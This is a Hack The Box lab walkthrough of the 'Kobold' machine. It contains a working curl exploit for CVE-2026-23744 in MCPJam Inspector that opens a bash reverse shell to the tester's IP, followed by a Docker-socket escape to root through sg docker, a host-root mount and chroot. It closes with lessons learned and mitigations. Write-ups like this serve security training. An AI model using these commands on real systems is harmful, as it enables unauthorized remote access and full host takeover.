---
title: "HTB Walkthrough: Kobold"
date: 2026-06-01
draft: false
description: "Full walkthrough of the Kobold machine from Hack The Box. Easy difficulty, Linux. Unauthenticated RCE on MCPJam Inspector 1.4.2 (CVE-2026-23744) via the /api/mcp/connect endpoint → shell as ben → Docker socket access through the operator group with sg docker → mount the host root filesystem and chroot to get root."
tags: ["HackTheBox", "Linux", "Easy", "CVE-2026-23744", "MCPJam", "RCE", "Docker", "DockerEscape", "sg", "PrivEsc", "MCP", "kobold", "writeups"]
categories: ["HTB Walkthroughs"]
series: ["HackTheBox CPTS"]
---

{{< lead >}}
Walkthrough of **Kobold** on Hack The Box. **Easy** difficulty machine running **Linux**. Exploitation goes through **CVE-2026-23744**, an unauthenticated RCE in MCPJam Inspector 1.4.2: the `/api/mcp/connect` endpoint passes the `command` field directly to `child_process.spawn()` without any validation. Privilege escalation to root exploits the fact that user `ben` belongs to the `operator` group, which has permissions over the Docker socket — accessible via `sg docker` without needing to log out. With access to the Docker daemon, we mount the host filesystem and get root with `chroot`.
{{< /lead >}}

{{< badge >}}HackTheBox{{< /badge >}}
{{< badge >}}Linux{{< /badge >}}
{{< badge >}}Easy{{< /badge >}}

---

## 🗺️ Machine Info

| Field          | Detail                                                                                      |
|----------------|---------------------------------------------------------------------------------------------|
| **Name**       | Kobold                                                                                      |
| **OS**         | Linux (Ubuntu)                                                                              |
| **Difficulty** | Easy                                                                                        |
| **IP**         | 10.129.6.231                                                                                |
| **Techniques** | CVE-2026-23744 · MCPJam RCE · Docker socket escape · `sg` group bypass · `chroot` privesc  |

---

## 1. Reconnaissance

### 1.1 Port Scan

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.6.231
```

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
3552/tcp open  taserver
```

```bash
echo "10.129.6.231 kobold.htb" >> /etc/hosts
```

> **💡 Attack surface:** two web ports (80/443) and an unknown service on 3552. Initial focus is the web application.

---

## 2. Subdomain Enumeration

```bash
gobuster vhost -u "https://kobold.htb" \
  -w /usr/share/wordlists/dirb/common.txt \
  --append-domain \
  --no-tls-validation
```

```
Found: bin.kobold.htb   [Status: 200, Size: 24402]
Found: mcp.kobold.htb   [Status: 200, Size: 466]
```

```bash
echo "10.129.6.231 bin.kobold.htb mcp.kobold.htb" >> /etc/hosts
```

- `bin.kobold.htb` → **PrivateBin** instance (text/code sharing). Runs in a Docker container on internal port 8080.
- `mcp.kobold.htb` → **MCPJam Inspector version 1.4.2** — vulnerable to **CVE-2026-23744**.

---

## 3. Exploitation — CVE-2026-23744 (MCPJam Inspector RCE)

### 3.1 The Vulnerability

The `/api/mcp/connect` endpoint of MCPJam Inspector 1.4.2 accepts a `serverConfig` with the `command` field, which is passed directly to `child_process.spawn()` **without validation or authentication**. We can specify `bash` as the command and a reverse shell as the argument.

### 3.2 Exploit Execution

```bash
nc -lvnp 4444
```

```bash
curl -k https://mcp.kobold.htb/api/mcp/connect \
  --header "Content-Type: application/json" \
  --data '{
    "serverConfig": {
      "command": "bash",
      "args": ["-c", "bash -i >& /dev/tcp/10.10.14.211/4444 0>&1"],
      "env": {}
    },
    "serverId": "pwn"
  }'
```

> **💡 `-k`** ignores the server's self-signed TLS certificate.

```
Connection received on 10.129.6.231
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$
```

```bash
ben@kobold:~$ id
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
```

> ✅ **Shell obtained as `ben`.** The `operator` group is relevant — we'll come back to it during escalation.

### 3.3 TTY Stabilization

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm; export SHELL=bash
stty rows 40 cols 150; reset
```

---

## 4. User Flag

```bash
ben@kobold:~$ cat user.txt
```

> 🔑 User flag obtained.

---

## 5. Privilege Escalation — Docker Socket Escape via `sg`

### 5.1 Docker Environment Enumeration

```bash
ben@kobold:~$ docker ps
```

```
permission denied while trying to connect to the Docker daemon socket at
unix:///var/run/docker.sock: connect: permission denied
```

`ben` doesn't belong to the `docker` group directly. But it belongs to the **`operator`** group — we try running in its context with `sg`:

```bash
ben@kobold:~$ sg docker -c "docker ps"
```

```
CONTAINER ID   IMAGE                               COMMAND                  STATUS
4c49dd7bb727   privatebin/nginx-fpm-alpine:2.0.2   "/etc/init.d/rc.local"  Up 2 hours
                                                                            127.0.0.1:8080->8080/tcp  bin
```

> **💡 `sg <group> -c "<cmd>"`** executes a command with the specified group's effective GID, without needing to log out/log in. It works because `operator` has permissions over `/var/run/docker.sock`, even though `ben` doesn't see it in the primary group listing.

### 5.2 Why Docker Socket Access Equals Root

The `/var/run/docker.sock` socket controls the Docker daemon, which runs as root. With access to that socket we can launch a container with the **host root filesystem mounted** (`-v /:/mnt`) and run it as UID 0 (`-u 0`). Once inside, `chroot /mnt` changes our root to the host filesystem, giving us full root access.

### 5.3 Escape to Host

```bash
ben@kobold:~$ sg docker -c "docker run --rm -it -u 0 --entrypoint sh -v /:/mnt privatebin/nginx-fpm-alpine:2.0.2"
```

| Parameter | Effect |
|---|---|
| `--rm` | Remove container on exit (cleanup) |
| `-it` | Interactive terminal |
| `-u 0` | Run as UID 0 (root) inside the container |
| `--entrypoint sh` | Override entrypoint to get a shell directly |
| `-v /:/mnt` | Mount the **host** root filesystem at `/mnt` inside the container |

```bash
/var/www # chroot /mnt sh
```

```bash
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),27(sudo)
```

> ✅ **Root obtained. `chroot /mnt` makes all commands operate on the real host system with root privileges.**

---

## 6. Root Flag

```bash
# cat /root/root.txt
```

> 🏁 Root flag obtained.

---

## 7. Summary and Lessons Learned

**Compromise path:**

1. **Recon** → Ports 22, 80, 443, 3552. Virtual host `kobold.htb`.
2. **Gobuster vhost** → Subdomains `bin.kobold.htb` (PrivateBin) and `mcp.kobold.htb` (MCPJam Inspector 1.4.2).
3. **CVE-2026-23744** → `/api/mcp/connect` without validation → `bash` as `command` → reverse shell as `ben`.
4. **`id`** → `ben` belongs to the `operator` group.
5. **`sg docker`** → Docker socket access through `operator`'s GID.
6. **`docker run -u 0 -v /:/mnt`** → root container with host mounted.
7. **`chroot /mnt`** → host filesystem as root.

**What I learned from this machine:**

- **`child_process.spawn()` with unvalidated input is direct RCE.** MCPJam passed the `command` field from the JSON request directly to the process spawner with no whitelist or authentication. In Node.js applications that need to execute subprocesses, the only safe approach is to build the argument list statically — never interpolating user input — and apply authentication before any endpoint that interacts with the system.

- **Secondary group membership may not be obvious in `id` output, but `sg` materializes it.** `ben` didn't appear in the `docker` group, but `operator` had permissions over the socket. Enumerating `/var/run/docker.sock` and cross-referencing with user groups (including indirect groups) is a step worth automating in any post-exploitation enumeration script.

- **Docker socket access equals host root, without exception.** It doesn't matter whether the user lacks `sudo`, is inside a container, or system permissions appear restricted — if they can talk to `/var/run/docker.sock`, they have root. This machine illustrates it cleanly: the "restriction" that `ben` wasn't in the `docker` group was irrelevant because `operator` opened the same door from the side.

- **`sg` is a legitimate system tool that can be used as an escalation vector.** Many post-exploitation guides don't mention it, but in any system where a user belongs to a secondary group with elevated permissions over a critical resource, `sg` materializes those permissions in a command without modifying the current session. Worth keeping in mind alongside `newgrp` and similar tools.

**Mitigations:**

| Vector | Mitigation |
|--------|------------|
| CVE-2026-23744 — MCPJam RCE on `/api/mcp/connect` | Update MCPJam Inspector; don't expose the inspector without authentication; validate and whitelist allowed commands |
| Docker socket accessible via `operator` group | Never grant `/var/run/docker.sock` access to unprivileged users; use rootless Docker or Podman where possible |
| `sg docker` bypasses group restriction | Audit which groups have permissions over the socket; restrict with `chmod`/`chown`; consider filesystem ACLs for finer control |
| `docker run -v /:/mnt` allows reading/writing the full host | Use `--read-only` and `seccomp`/`AppArmor` profiles; never mount the host root filesystem in production containers |
